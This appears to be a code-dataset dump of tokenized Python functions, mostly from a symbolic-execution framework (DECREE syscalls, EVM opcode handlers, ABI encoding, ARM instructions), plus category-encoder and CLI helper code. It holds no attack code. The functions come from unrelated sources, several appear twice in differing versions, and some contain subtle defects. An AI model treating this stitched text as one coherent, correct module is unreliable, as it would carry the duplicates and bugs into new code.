def write_back_memory ( self , where , expr , size ) : if self . write_backs_disabled : return if type ( expr ) is bytes : self . _emu . mem_write ( where , expr ) else : if issymbolic ( expr ) : data = [ Operators . CHR ( Operators . EXTRACT ( expr , offset , 8 ) ) for offset in range ( 0 , size , 8 ) ] concrete_data = [ ] for c in data : if issymbolic ( c ) : c = chr ( solver . get_value ( self . _cpu . memory . constraints , c ) ) concrete_data . append ( c ) data = concrete_data else : data = [ Operators . CHR ( Operators . EXTRACT ( expr , offset , 8 ) ) for offset in range ( 0 , size , 8 ) ] logger . debug ( f"Writing back {hr_size(size // 8)} to {hex(where)}: {data}" ) # TODO - the extra encoding is to handle null bytes output as strings when we concretize. That's probably a bug. self . _emu . mem_write ( where , b'' . join ( b . encode ( 'utf-8' ) if type ( b ) is str else b for b in data ) )
def update_segment ( self , selector , base , size , perms ) : logger . info ( "Updating selector %s to 0x%02x (%s bytes) (%s)" , selector , base , size , perms ) if selector == 99 : self . set_fs ( base ) else : logger . error ( "No way to write segment: %d" , selector )
def deprecated ( message : str ) : assert isinstance ( message , str ) , "The deprecated decorator requires a message string argument." def decorator ( func ) : @ wraps ( func ) def wrapper ( * args , * * kwargs ) : warnings . warn ( f"`{func.__qualname__}` is deprecated. {message}" , category = ManticoreDeprecationWarning , stacklevel = 2 ) return func ( * args , * * kwargs ) return wrapper return decorator
def input_from_cons ( constupl , datas ) : def make_chr ( c ) : try : return chr ( c ) except Exception : return c newset = constraints_to_constraintset ( constupl ) ret = '' for data in datas : for c in data : ret += make_chr ( solver . get_value ( newset , c ) ) return ret
def write ( self , data ) : size = min ( len ( data ) , self . max_size - self . pos ) for i in range ( self . pos , self . pos + size ) : self . array [ i ] = data [ i - self . pos ]
def sys_fsync ( self , fd ) : ret = 0 try : self . files [ fd ] . sync ( ) except IndexError : ret = - errno . EBADF except FdError : ret = - errno . EINVAL return ret
def awake ( self , procid ) : logger . debug ( f"Remove procid:{procid} from waitlists and reestablish it in the running list" ) for wait_list in self . rwait : if procid in wait_list : wait_list . remove ( procid ) for wait_list in self . twait : if procid in wait_list : wait_list . remove ( procid ) self . timers [ procid ] = None self . running . append ( procid ) if self . _current is None : self . _current = procid
def signal_receive ( self , fd ) : connections = self . connections if connections ( fd ) and self . twait [ connections ( fd ) ] : procid = random . sample ( self . twait [ connections ( fd ) ] , 1 ) [ 0 ] self . awake ( procid )
def signal_transmit ( self , fd ) : connection = self . connections ( fd ) if connection is None or connection >= len ( self . rwait ) : return procs = self . rwait [ connection ] if procs : procid = random . sample ( procs , 1 ) [ 0 ] self . awake ( procid )
def check_timers ( self ) : if self . _current is None : # Advance the clocks. Go to future!! advance = min ( [ self . clocks ] + [ x for x in self . timers if x is not None ] ) + 1 logger . debug ( f"Advancing the clock from {self.clocks} to {advance}" ) self . clocks = advance for procid in range ( len ( self . timers ) ) : if self . timers [ procid ] is not None : if self . clocks > self . timers [ procid ] : self . procs [ procid ] . PC += self . procs [ procid ] . instruction . size self . awake ( procid )
def sys_fdwait ( self , cpu , nfds , readfds , writefds , timeout , readyfds ) : logger . debug ( "FDWAIT(%d, 0x%08x, 0x%08x, 0x%08x, 0x%08x)" % ( nfds , readfds , writefds , timeout , readyfds ) ) if timeout : if timeout not in cpu . memory : # todo: size logger . info ( "FDWAIT: timeout is pointing to invalid memory. Returning EFAULT" ) return Decree . CGC_EFAULT if readyfds : if readyfds not in cpu . memory : logger . info ( "FDWAIT: readyfds pointing to invalid memory. Returning EFAULT" ) return Decree . CGC_EFAULT writefds_wait = set ( ) writefds_ready = set ( ) fds_bitsize = ( nfds + 7 ) & ~ 7 if writefds : if writefds not in cpu . memory : logger . info ( "FDWAIT: writefds pointing to invalid memory. Returning EFAULT" ) return Decree . CGC_EFAULT bits = cpu . read_int ( writefds , fds_bitsize ) for fd in range ( nfds ) : if ( bits & 1 << fd ) : if self . files [ fd ] . is_full ( ) : writefds_wait . add ( fd ) else : writefds_ready . add ( fd ) readfds_wait = set ( ) readfds_ready = set ( ) if readfds : if readfds not in cpu . memory : logger . info ( "FDWAIT: readfds pointing to invalid memory. Returning EFAULT" ) return Decree . CGC_EFAULT bits = cpu . read_int ( readfds , fds_bitsize ) for fd in range ( nfds ) : if ( bits & 1 << fd ) : if self . files [ fd ] . is_empty ( ) : readfds_wait . add ( fd ) else : readfds_ready . add ( fd ) n = len ( readfds_ready ) + len ( writefds_ready ) if n == 0 : # TODO FIX timeout symbolic if timeout != 0 : seconds = cpu . read_int ( timeout , 32 ) microseconds = cpu . read_int ( timeout + 4 , 32 ) logger . info ( "FDWAIT: waiting for read on fds: {%s} and write to: {%s} timeout: %d" , repr ( list ( readfds_wait ) ) , repr ( list ( writefds_wait ) ) , microseconds + 1000 * seconds ) to = microseconds + 1000 * seconds # no ready file, wait else : to = None logger . info ( "FDWAIT: waiting for read on fds: {%s} and write to: {%s} timeout: INDIFENITELY" , repr ( list ( readfds_wait ) ) , repr ( list ( writefds_wait ) ) ) cpu . PC -= cpu . instruction . size self . wait ( readfds_wait , writefds_wait , to ) raise RestartSyscall ( ) # When coming back from a timeout remember # not to backtrack instruction and set EAX to 0! :( ugliness alert! if readfds : bits = 0 for fd in readfds_ready : bits |= 1 << fd for byte in range ( 0 , nfds , 8 ) : cpu . write_int ( readfds , ( bits >> byte ) & 0xff , 8 ) if writefds : bits = 0 for fd in writefds_ready : bits |= 1 << fd for byte in range ( 0 , nfds , 8 ) : cpu . write_int ( writefds , ( bits >> byte ) & 0xff , 8 ) logger . info ( "FDWAIT: continuing. Some file is ready Readyfds: %08x" , readyfds ) if readyfds : cpu . write_int ( readyfds , n , 32 ) self . syscall_trace . append ( ( "_fdwait" , - 1 , None ) ) return 0
def signal_transmit ( self , fd ) : connections = self . connections if connections ( fd ) and self . rwait [ connections ( fd ) ] : procid = random . sample ( self . rwait [ connections ( fd ) ] , 1 ) [ 0 ] self . awake ( procid )
def sys_receive ( self , cpu , fd , buf , count , rx_bytes ) : if issymbolic ( fd ) : logger . info ( "Ask to read from a symbolic file descriptor!!" ) cpu . PC = cpu . PC - cpu . instruction . size raise SymbolicSyscallArgument ( cpu , 0 ) if issymbolic ( buf ) : logger . info ( "Ask to read to a symbolic buffer" ) cpu . PC = cpu . PC - cpu . instruction . size raise SymbolicSyscallArgument ( cpu , 1 ) if issymbolic ( count ) : logger . info ( "Ask to read a symbolic number of bytes " ) cpu . PC = cpu . PC - cpu . instruction . size raise SymbolicSyscallArgument ( cpu , 2 ) if issymbolic ( rx_bytes ) : logger . info ( "Ask to return size to a symbolic address " ) cpu . PC = cpu . PC - cpu . instruction . size raise SymbolicSyscallArgument ( cpu , 3 ) return super ( ) . sys_receive ( cpu , fd , buf , count , rx_bytes )
def sys_transmit ( self , cpu , fd , buf , count , tx_bytes ) : if issymbolic ( fd ) : logger . info ( "Ask to write to a symbolic file descriptor!!" ) cpu . PC = cpu . PC - cpu . instruction . size raise SymbolicSyscallArgument ( cpu , 0 ) if issymbolic ( buf ) : logger . info ( "Ask to write to a symbolic buffer" ) cpu . PC = cpu . PC - cpu . instruction . size raise SymbolicSyscallArgument ( cpu , 1 ) if issymbolic ( count ) : logger . info ( "Ask to write a symbolic number of bytes " ) cpu . PC = cpu . PC - cpu . instruction . size raise SymbolicSyscallArgument ( cpu , 2 ) if issymbolic ( tx_bytes ) : logger . info ( "Ask to return size to a symbolic address " ) cpu . PC = cpu . PC - cpu . instruction . size raise SymbolicSyscallArgument ( cpu , 3 ) return super ( ) . sys_transmit ( cpu , fd , buf , count , tx_bytes )
def visit_Operation ( self , expression , * operands ) : operation = self . operations . get ( type ( expression ) , None ) if operation is not None and all ( isinstance ( o , Constant ) for o in operands ) : value = operation ( * ( x . value for x in operands ) ) if isinstance ( expression , BitVec ) : return BitVecConstant ( expression . size , value , taint = expression . taint ) else : isinstance ( expression , Bool ) return BoolConstant ( value , taint = expression . taint ) else : if any ( operands [ i ] is not expression . operands [ i ] for i in range ( len ( operands ) ) ) : expression = self . _rebuild ( expression , operands ) return expression
def visit_Operation ( self , expression , * operands ) : if all ( isinstance ( o , Constant ) for o in operands ) : expression = constant_folder ( expression ) if self . _changed ( expression , operands ) : expression = self . _rebuild ( expression , operands ) return expression
def _type_size ( ty ) : if ty [ 0 ] in ( 'int' , 'uint' , 'bytesM' , 'function' ) : return 32 elif ty [ 0 ] in ( 'tuple' ) : result = 0 for ty_i in ty [ 1 ] : result += ABI . _type_size ( ty_i ) return result elif ty [ 0 ] in ( 'array' ) : rep = ty [ 1 ] result = 32 # offset link return result elif ty [ 0 ] in ( 'bytes' , 'string' ) : result = 32 # offset link return result raise ValueError
def function_call ( type_spec , * args ) : m = re . match ( r"(?P<name>[a-zA-Z_][a-zA-Z_0-9]*)(?P<type>\(.*\))" , type_spec ) if not m : raise EthereumError ( "Function signature expected" ) ABI . _check_and_warn_num_args ( type_spec , * args ) result = ABI . function_selector ( type_spec ) # Funcid result += ABI . serialize ( m . group ( 'type' ) , * args ) return result
def function_selector ( method_name_and_signature ) : s = sha3 . keccak_256 ( ) s . update ( method_name_and_signature . encode ( ) ) return bytes ( s . digest ( ) [ : 4 ] )
def _serialize_uint ( value , size = 32 , padding = 0 ) : if size <= 0 or size > 32 : raise ValueError from . account import EVMAccount # because of circular import if not isinstance ( value , ( int , BitVec , EVMAccount ) ) : raise ValueError if issymbolic ( value ) : # FIXME This temporary array variable should be obtained from a specific constraint store bytes = ArrayVariable ( index_bits = 256 , index_max = 32 , value_bits = 8 , name = 'temp{}' . format ( uuid . uuid1 ( ) ) ) if value . size <= size * 8 : value = Operators . ZEXTEND ( value , size * 8 ) else : # automatically truncate, e.g. if they passed a BitVec(256) for an `address` argument (160 bits) value = Operators . EXTRACT ( value , 0 , size * 8 ) bytes = ArrayProxy ( bytes . write_BE ( padding , value , size ) ) else : value = int ( value ) bytes = bytearray ( ) for _ in range ( padding ) : bytes . append ( 0 ) for position in reversed ( range ( size ) ) : bytes . append ( Operators . EXTRACT ( value , position * 8 , 8 ) ) assert len ( bytes ) == size + padding return bytes
def _serialize_int ( value , size = 32 , padding = 0 ) : if size <= 0 or size > 32 : raise ValueError if not isinstance ( value , ( int , BitVec ) ) : raise ValueError if issymbolic ( value ) : buf = ArrayVariable ( index_bits = 256 , index_max = 32 , value_bits = 8 , name = 'temp{}' . format ( uuid . uuid1 ( ) ) ) value = Operators . SEXTEND ( value , value . size , size * 8 ) buf = ArrayProxy ( buf . write_BE ( padding , value , size ) ) else : value = int ( value ) buf = bytearray ( ) for _ in range ( padding ) : buf . append ( 0 ) for position in reversed ( range ( size ) ) : buf . append ( Operators . EXTRACT ( value , position * 8 , 8 ) ) return buf
def instruction ( self ) : # FIXME check if pc points to invalid instruction # if self.pc >= len(self.bytecode): #    return InvalidOpcode('Code out of range') # if self.pc in self.invalid: #    raise InvalidOpcode('Opcode inside a PUSH immediate') try : _decoding_cache = getattr ( self , '_decoding_cache' ) except Exception : _decoding_cache = self . _decoding_cache = { } pc = self . pc if isinstance ( pc , Constant ) : pc = pc . value if pc in _decoding_cache : return _decoding_cache [ pc ] def getcode ( ) : bytecode = self . bytecode for pc_i in range ( pc , len ( bytecode ) ) : yield simplify ( bytecode [ pc_i ] ) . value while True : yield 0 instruction = EVMAsm . disassemble_one ( getcode ( ) , pc = pc , fork = DEFAULT_FORK ) _decoding_cache [ pc ] = instruction return instruction
def _top ( self , n = 0 ) : if len ( self . stack ) - n < 0 : raise StackUnderflow ( ) return self . stack [ n - 1 ]
def _rollback ( self ) : last_pc , last_gas , last_instruction , last_arguments , fee , allocated = self . _checkpoint_data self . _push_arguments ( last_arguments ) self . _gas = last_gas self . _pc = last_pc self . _allocated = allocated self . _checkpoint_data = None
def _store ( self , offset , value , size = 1 ) : self . memory . write_BE ( offset , value , size ) for i in range ( size ) : self . _publish ( 'did_evm_write_memory' , offset + i , Operators . EXTRACT ( value , ( size - i - 1 ) * 8 , 8 ) )
def SMOD ( self , a , b ) : s0 , s1 = to_signed ( a ) , to_signed ( b ) sign = Operators . ITEBV ( 256 , s0 < 0 , - 1 , 1 ) try : result = ( Operators . ABS ( s0 ) % Operators . ABS ( s1 ) ) * sign except ZeroDivisionError : result = 0 return Operators . ITEBV ( 256 , s1 == 0 , 0 , result )
def EXP_gas ( self , base , exponent ) : EXP_SUPPLEMENTAL_GAS = 10 # cost of EXP exponent per byte def nbytes ( e ) : result = 0 for i in range ( 32 ) : result = Operators . ITEBV ( 512 , Operators . EXTRACT ( e , i * 8 , 8 ) != 0 , i + 1 , result ) return result return EXP_SUPPLEMENTAL_GAS * nbytes ( exponent )
def SIGNEXTEND ( self , size , value ) : # FIXME maybe use Operators.SEXTEND testbit = Operators . ITEBV ( 256 , size <= 31 , size * 8 + 7 , 257 ) result1 = ( value | ( TT256 - ( 1 << testbit ) ) ) result2 = ( value & ( ( 1 << testbit ) - 1 ) ) result = Operators . ITEBV ( 256 , ( value & ( 1 << testbit ) ) != 0 , result1 , result2 ) return Operators . ITEBV ( 256 , size <= 31 , result , value )
def LT ( self , a , b ) : return Operators . ITEBV ( 256 , Operators . ULT ( a , b ) , 1 , 0 )
def GT ( self , a , b ) : return Operators . ITEBV ( 256 , Operators . UGT ( a , b ) , 1 , 0 )
def SGT ( self , a , b ) : # http://gavwood.com/paper.pdf s0 , s1 = to_signed ( a ) , to_signed ( b ) return Operators . ITEBV ( 256 , s0 > s1 , 1 , 0 )
def BYTE ( self , offset , value ) : offset = Operators . ITEBV ( 256 , offset < 32 , ( 31 - offset ) * 8 , 256 ) return Operators . ZEXTEND ( Operators . EXTRACT ( value , offset , 8 ) , 256 )
def SHA3 ( self , start , size ) : # read memory from start to end # http://gavwood.com/paper.pdf data = self . try_simplify_to_constant ( self . read_buffer ( start , size ) ) if issymbolic ( data ) : known_sha3 = { } # Broadcast the signal self . _publish ( 'on_symbolic_sha3' , data , known_sha3 ) # This updates the local copy of sha3 with the pairs we need to explore value = 0 # never used known_hashes_cond = False for key , hsh in known_sha3 . items ( ) : assert not issymbolic ( key ) , "Saved sha3 data,hash pairs should be concrete" cond = key == data known_hashes_cond = Operators . OR ( cond , known_hashes_cond ) value = Operators . ITEBV ( 256 , cond , hsh , value ) return value value = sha3 . keccak_256 ( data ) . hexdigest ( ) value = int ( value , 16 ) self . _publish ( 'on_concrete_sha3' , data , value ) logger . info ( "Found a concrete SHA3 example %r -> %x" , data , value ) return value
def CALLDATALOAD ( self , offset ) : if issymbolic ( offset ) : if solver . can_be_true ( self . _constraints , offset == self . _used_calldata_size ) : self . constraints . add ( offset == self . _used_calldata_size ) raise ConcretizeArgument ( 1 , policy = 'SAMPLED' ) self . _use_calldata ( offset , 32 ) data_length = len ( self . data ) bytes = [ ] for i in range ( 32 ) : try : c = Operators . ITEBV ( 8 , offset + i < data_length , self . data [ offset + i ] , 0 ) except IndexError : # offset + i is concrete and outside data c = 0 bytes . append ( c ) return Operators . CONCAT ( 256 , * bytes )
def CALLDATACOPY ( self , mem_offset , data_offset , size ) : if issymbolic ( size ) : if solver . can_be_true ( self . _constraints , size <= len ( self . data ) + 32 ) : self . constraints . add ( size <= len ( self . data ) + 32 ) raise ConcretizeArgument ( 3 , policy = 'SAMPLED' ) if issymbolic ( data_offset ) : if solver . can_be_true ( self . _constraints , data_offset == self . _used_calldata_size ) : self . constraints . add ( data_offset == self . _used_calldata_size ) raise ConcretizeArgument ( 2 , policy = 'SAMPLED' ) #account for calldata usage self . _use_calldata ( data_offset , size ) self . _allocate ( mem_offset , size ) for i in range ( size ) : try : c = Operators . ITEBV ( 8 , data_offset + i < len ( self . data ) , Operators . ORD ( self . data [ data_offset + i ] ) , 0 ) except IndexError : # data_offset + i is concrete and outside data c = 0 self . _store ( mem_offset + i , c )
def CODECOPY ( self , mem_offset , code_offset , size ) : self . _allocate ( mem_offset , size ) GCOPY = 3 # cost to copy one 32 byte word copyfee = self . safe_mul ( GCOPY , Operators . UDIV ( self . safe_add ( size , 31 ) , 32 ) ) self . _consume ( copyfee ) if issymbolic ( size ) : max_size = solver . max ( self . constraints , size ) else : max_size = size for i in range ( max_size ) : if issymbolic ( i < size ) : default = Operators . ITEBV ( 8 , i < size , 0 , self . _load ( mem_offset + i , 1 ) ) # Fixme. unnecessary memory read else : if i < size : default = 0 else : default = self . _load ( mem_offset + i , 1 ) if issymbolic ( code_offset ) : value = Operators . ITEBV ( 8 , code_offset + i >= len ( self . bytecode ) , default , self . bytecode [ code_offset + i ] ) else : if code_offset + i >= len ( self . bytecode ) : value = default else : value = self . bytecode [ code_offset + i ] self . _store ( mem_offset + i , value ) self . _publish ( 'did_evm_read_code' , code_offset , size )
def EXTCODECOPY ( self , account , address , offset , size ) : extbytecode = self . world . get_code ( account ) self . _allocate ( address + size ) for i in range ( size ) : if offset + i < len ( extbytecode ) : self . _store ( address + i , extbytecode [ offset + i ] ) else : self . _store ( address + i , 0 )
def MLOAD ( self , address ) : self . _allocate ( address , 32 ) value = self . _load ( address , 32 ) return value
def MSTORE ( self , address , value ) : if istainted ( self . pc ) : for taint in get_taints ( self . pc ) : value = taint_with ( value , taint ) self . _allocate ( address , 32 ) self . _store ( address , value , 32 )
def MSTORE8 ( self , address , value ) : if istainted ( self . pc ) : for taint in get_taints ( self . pc ) : value = taint_with ( value , taint ) self . _allocate ( address , 1 ) self . _store ( address , Operators . EXTRACT ( value , 0 , 8 ) , 1 )
def SLOAD ( self , offset ) : storage_address = self . address self . _publish ( 'will_evm_read_storage' , storage_address , offset ) value = self . world . get_storage_data ( storage_address , offset ) self . _publish ( 'did_evm_read_storage' , storage_address , offset , value ) return value
def SSTORE ( self , offset , value ) : storage_address = self . address self . _publish ( 'will_evm_write_storage' , storage_address , offset , value ) #refund = Operators.ITEBV(256, #                         previous_value != 0, #                         Operators.ITEBV(256, value != 0, 0, GSTORAGEREFUND), #                         0) if istainted ( self . pc ) : for taint in get_taints ( self . pc ) : value = taint_with ( value , taint ) self . world . set_storage_data ( storage_address , offset , value ) self . _publish ( 'did_evm_write_storage' , storage_address , offset , value )
def JUMPI ( self , dest , cond ) : self . pc = Operators . ITEBV ( 256 , cond != 0 , dest , self . pc + self . instruction . size ) #This set ups a check for JMPDEST in the next instruction if cond != 0 self . _set_check_jmpdest ( cond != 0 )
def SWAP ( self , * operands ) : a = operands [ 0 ] b = operands [ - 1 ] return ( b , ) + operands [ 1 : - 1 ] + ( a , )
def CREATE ( self , value , offset , size ) : address = self . world . create_account ( address = EVMWorld . calculate_new_address ( sender = self . address , nonce = self . world . get_nonce ( self . address ) ) ) self . world . start_transaction ( 'CREATE' , address , data = self . read_buffer ( offset , size ) , caller = self . address , value = value , gas = self . gas ) raise StartTx ( )
def CREATE ( self , value , offset , size ) : tx = self . world . last_transaction # At this point last and current tx are the same. address = tx . address if tx . result == 'RETURN' : self . world . set_code ( tx . address , tx . return_data ) else : self . world . delete_account ( address ) address = 0 return address
def CALLCODE ( self , gas , _ignored_ , value , in_offset , in_size , out_offset , out_size ) : self . world . start_transaction ( 'CALLCODE' , address = self . address , data = self . read_buffer ( in_offset , in_size ) , caller = self . address , value = value , gas = gas ) raise StartTx ( )
def RETURN ( self , offset , size ) : data = self . read_buffer ( offset , size ) raise EndTx ( 'RETURN' , data )
def SELFDESTRUCT ( self , recipient ) : #This may create a user account recipient = Operators . EXTRACT ( recipient , 0 , 160 ) address = self . address #FIXME for on the known addresses if issymbolic ( recipient ) : logger . info ( "Symbolic recipient on self destruct" ) recipient = solver . get_value ( self . constraints , recipient ) if recipient not in self . world : self . world . create_account ( address = recipient ) self . world . send_funds ( address , recipient , self . world . get_balance ( address ) ) self . world . delete_account ( address ) raise EndTx ( 'SELFDESTRUCT' )
def current_human_transaction ( self ) : try : tx , _ , _ , _ , _ = self . _callstack [ 0 ] if tx . result is not None : #That tx finished. No current tx. return None assert tx . depth == 0 return tx except IndexError : return None
def new_address ( self , sender = None , nonce = None ) : if sender is not None and nonce is None : nonce = self . get_nonce ( sender ) new_address = self . calculate_new_address ( sender , nonce ) if sender is None and new_address in self : return self . new_address ( sender , nonce ) return new_address
def _swap_mode ( self ) : assert self . mode in ( cs . CS_MODE_ARM , cs . CS_MODE_THUMB ) if self . mode == cs . CS_MODE_ARM : self . mode = cs . CS_MODE_THUMB else : self . mode = cs . CS_MODE_ARM
def LDRD ( cpu , dest1 , dest2 , src , offset = None ) : assert dest1 . type == 'register' assert dest2 . type == 'register' assert src . type == 'memory' mem1 = cpu . read_int ( src . address ( ) , 32 ) mem2 = cpu . read_int ( src . address ( ) + 4 , 32 ) writeback = cpu . _compute_writeback ( src , offset ) dest1 . write ( mem1 ) dest2 . write ( mem2 ) cpu . _cs_hack_ldr_str_writeback ( src , offset , writeback )
def STRD ( cpu , src1 , src2 , dest , offset = None ) : assert src1 . type == 'register' assert src2 . type == 'register' assert dest . type == 'memory' val1 = src1 . read ( ) val2 = src2 . read ( ) writeback = cpu . _compute_writeback ( dest , offset ) cpu . write_int ( dest . address ( ) , val1 , 32 ) cpu . write_int ( dest . address ( ) + 4 , val2 , 32 ) cpu . _cs_hack_ldr_str_writeback ( dest , offset , writeback )
def context ( self ) : plugin_context_name = str ( type ( self ) ) if plugin_context_name not in self . manticore . context : self . manticore . context [ plugin_context_name ] = { } return self . manticore . context [ plugin_context_name ]
def _declare ( self , var ) : if var . name in self . _declarations : raise ValueError ( 'Variable already declared' ) self . _declarations [ var . name ] = var return var
def declarations ( self ) : declarations = GetDeclarations ( ) for a in self . constraints : try : declarations . visit ( a ) except RuntimeError : # TODO: (defunct) move recursion management out of PickleSerializer if sys . getrecursionlimit ( ) >= PickleSerializer . MAX_RECURSION : raise Exception ( f'declarations recursion limit surpassed {PickleSerializer.MAX_RECURSION}, aborting' ) new_limit = sys . getrecursionlimit ( ) + PickleSerializer . DEFAULT_RECURSION if new_limit <= PickleSerializer . DEFAULT_RECURSION : sys . setrecursionlimit ( new_limit ) return self . declarations return declarations . result
def is_declared ( self , expression_var ) : if not isinstance ( expression_var , Variable ) : raise ValueError ( f'Expression must be a Variable (not a {type(expression_var)})' ) return any ( expression_var is x for x in self . get_declared_variables ( ) )
def col_transform ( self , col , digits ) : if col is None or float ( col ) < 0.0 : return None else : col = self . number_to_base ( int ( col ) , self . base , digits ) if len ( col ) == digits : return col else : return [ 0 for _ in range ( digits - len ( col ) ) ] + col
def transform_leave_one_out ( self , X_in , y , mapping = None ) : X = X_in . copy ( deep = True ) random_state_ = check_random_state ( self . random_state ) # Prepare the data if y is not None : # Convert bools to numbers (the target must be summable) y = y . astype ( 'double' ) # Cumsum and cumcount do not work nicely with None. # This is a terrible workaround that will fail, when the # categorical input contains -999.9 for cat_col in X . select_dtypes ( 'category' ) . columns . values : X [ cat_col ] = X [ cat_col ] . cat . add_categories ( - 999.9 ) X = X . fillna ( - 999.9 ) for col , colmap in mapping . items ( ) : level_notunique = colmap [ 'count' ] > 1 unique_train = colmap . index unseen_values = pd . Series ( [ x for x in X_in [ col ] . unique ( ) if x not in unique_train ] ) is_nan = X_in [ col ] . isnull ( ) is_unknown_value = X_in [ col ] . isin ( unseen_values . dropna ( ) ) if self . handle_unknown == 'error' and is_unknown_value . any ( ) : raise ValueError ( 'Columns to be encoded can not contain new values' ) if y is None : # Replace level with its mean target; if level occurs only once, use global mean level_means = ( ( colmap [ 'sum' ] + self . _mean ) / ( colmap [ 'count' ] + 1 ) ) . where ( level_notunique , self . _mean ) X [ col ] = X [ col ] . map ( level_means ) else : # Simulation of CatBoost implementation, which calculates leave-one-out on the fly. # The nice thing about this is that it helps to prevent overfitting. The bad thing # is that CatBoost uses many iterations over the data. But we run just one iteration. # Still, it works better than leave-one-out without any noise. # See: #   https://tech.yandex.com/catboost/doc/dg/concepts/algorithm-main-stages_cat-to-numberic-docpage/ temp = y . groupby ( X [ col ] ) . agg ( [ 'cumsum' , 'cumcount' ] ) X [ col ] = ( temp [ 'cumsum' ] - y + self . _mean ) / ( temp [ 'cumcount' ] + 1 ) if self . handle_unknown == 'value' : X . loc [ is_unknown_value , col ] = self . _mean elif self . handle_unknown == 'return_nan' : X . loc [ is_unknown_value , col ] = np . nan if self . handle_missing == 'value' : X . loc [ is_nan & unseen_values . isnull ( ) . any ( ) , col ] = self . _mean elif self . handle_missing == 'return_nan' : X . loc [ is_nan , col ] = np . nan if self . sigma is not None and y is not None : X [ col ] = X [ col ] * random_state_ . normal ( 1. , self . sigma , X [ col ] . shape [ 0 ] ) return X
def get_obj_cols ( df ) : obj_cols = [ ] for idx , dt in enumerate ( df . dtypes ) : if dt == 'object' or is_category ( dt ) : obj_cols . append ( df . columns . values [ idx ] ) return obj_cols
def convert_input ( X ) : if not isinstance ( X , pd . DataFrame ) : if isinstance ( X , list ) : X = pd . DataFrame ( X ) elif isinstance ( X , ( np . generic , np . ndarray ) ) : X = pd . DataFrame ( X ) elif isinstance ( X , csr_matrix ) : X = pd . DataFrame ( X . todense ( ) ) elif isinstance ( X , pd . Series ) : X = pd . DataFrame ( X ) else : raise ValueError ( 'Unexpected input type: %s' % ( str ( type ( X ) ) ) ) X = X . apply ( lambda x : pd . to_numeric ( x , errors = 'ignore' ) ) return X
def transform_leave_one_out ( self , X_in , y , mapping = None ) : X = X_in . copy ( deep = True ) random_state_ = check_random_state ( self . random_state ) for col , colmap in mapping . items ( ) : level_notunique = colmap [ 'count' ] > 1 unique_train = colmap . index unseen_values = pd . Series ( [ x for x in X [ col ] . unique ( ) if x not in unique_train ] ) is_nan = X [ col ] . isnull ( ) is_unknown_value = X [ col ] . isin ( unseen_values . dropna ( ) ) if self . handle_unknown == 'error' and is_unknown_value . any ( ) : raise ValueError ( 'Columns to be encoded can not contain new values' ) if y is None : # Replace level with its mean target; if level occurs only once, use global mean level_means = ( colmap [ 'sum' ] / colmap [ 'count' ] ) . where ( level_notunique , self . _mean ) X [ col ] = X [ col ] . map ( level_means ) else : # Replace level with its mean target, calculated excluding this row's target # The y (target) mean for this level is normally just the sum/count; # excluding this row's y, it's (sum - y) / (count - 1) level_means = ( X [ col ] . map ( colmap [ 'sum' ] ) - y ) / ( X [ col ] . map ( colmap [ 'count' ] ) - 1 ) # The 'where' fills in singleton levels (count = 1 -> div by 0) with the global mean X [ col ] = level_means . where ( X [ col ] . map ( colmap [ 'count' ] [ level_notunique ] ) . notnull ( ) , self . _mean ) if self . handle_unknown == 'value' : X . loc [ is_unknown_value , col ] = self . _mean elif self . handle_unknown == 'return_nan' : X . loc [ is_unknown_value , col ] = np . nan if self . handle_missing == 'value' : X . loc [ is_nan & unseen_values . isnull ( ) . any ( ) , col ] = self . _mean elif self . handle_missing == 'return_nan' : X . loc [ is_nan , col ] = np . nan if self . sigma is not None and y is not None : X [ col ] = X [ col ] * random_state_ . normal ( 1. , self . sigma , X [ col ] . shape [ 0 ] ) return X
def score_models ( clf , X , y , encoder , runs = 1 ) : scores = [ ] X_test = None for _ in range ( runs ) : X_test = encoder ( ) . fit_transform ( X , y ) # Some models, like logistic regression, like normalized features otherwise they underperform and/or take a long time to converge. # To be rigorous, we should have trained the normalization on each fold individually via pipelines. # See grid_search_example to learn how to do it. X_test = StandardScaler ( ) . fit_transform ( X_test ) scores . append ( cross_validate ( clf , X_test , y , n_jobs = 1 , cv = 5 ) [ 'test_score' ] ) gc . collect ( ) scores = [ y for z in [ x for x in scores ] for y in z ] return float ( np . mean ( scores ) ) , float ( np . std ( scores ) ) , scores , X_test . shape [ 1 ]
def main ( loader , name ) : scores = [ ] raw_scores_ds = { } # first get the dataset X , y , mapping = loader ( ) clf = linear_model . LogisticRegression ( solver = 'lbfgs' , multi_class = 'auto' , max_iter = 200 , random_state = 0 ) # try each encoding method available, which works on multiclass problems encoders = ( set ( category_encoders . __all__ ) - { 'WOEEncoder' } ) # WoE is currently only for binary targets for encoder_name in encoders : encoder = getattr ( category_encoders , encoder_name ) start_time = time . time ( ) score , stds , raw_scores , dim = score_models ( clf , X , y , encoder ) scores . append ( [ encoder_name , name , dim , score , stds , time . time ( ) - start_time ] ) raw_scores_ds [ encoder_name ] = raw_scores gc . collect ( ) results = pd . DataFrame ( scores , columns = [ 'Encoding' , 'Dataset' , 'Dimensionality' , 'Avg. Score' , 'Score StDev' , 'Elapsed Time' ] ) raw = pd . DataFrame . from_dict ( raw_scores_ds ) ax = raw . plot ( kind = 'box' , return_type = 'axes' ) plt . title ( 'Scores for Encodings on %s Dataset' % ( name , ) ) plt . ylabel ( 'Score (higher is better)' ) for tick in ax . get_xticklabels ( ) : tick . set_rotation ( 90 ) plt . grid ( ) plt . tight_layout ( ) plt . show ( ) return results , raw
def format_options ( self , ctx , formatter ) : field_opts = [ ] global_opts = [ ] local_opts = [ ] other_opts = [ ] for param in self . params : if param . name in SETTINGS_PARMS : opts = global_opts elif getattr ( param , 'help' , None ) and param . help . startswith ( '[FIELD]' ) : opts = field_opts param . help = param . help [ len ( '[FIELD]' ) : ] else : opts = local_opts rv = param . get_help_record ( ctx ) if rv is None : continue else : opts . append ( rv ) if self . add_help_option : help_options = self . get_help_option_names ( ctx ) if help_options : other_opts . append ( [ join_options ( help_options ) [ 0 ] , 'Show this message and exit.' ] ) if field_opts : with formatter . section ( 'Field Options' ) : formatter . write_dl ( field_opts ) if local_opts : with formatter . section ( 'Local Options' ) : formatter . write_dl ( local_opts ) if global_opts : with formatter . section ( 'Global Options' ) : formatter . write_dl ( global_opts ) if other_opts : with formatter . section ( 'Other Options' ) : formatter . write_dl ( other_opts )
def _convert_pagenum ( self , kwargs ) : for key in ( 'next' , 'previous' ) : if not kwargs . get ( key ) : continue match = re . search ( r'page=(?P<num>[\d]+)' , kwargs [ key ] ) if match is None and key == 'previous' : kwargs [ key ] = 1 continue kwargs [ key ] = int ( match . groupdict ( ) [ 'num' ] )
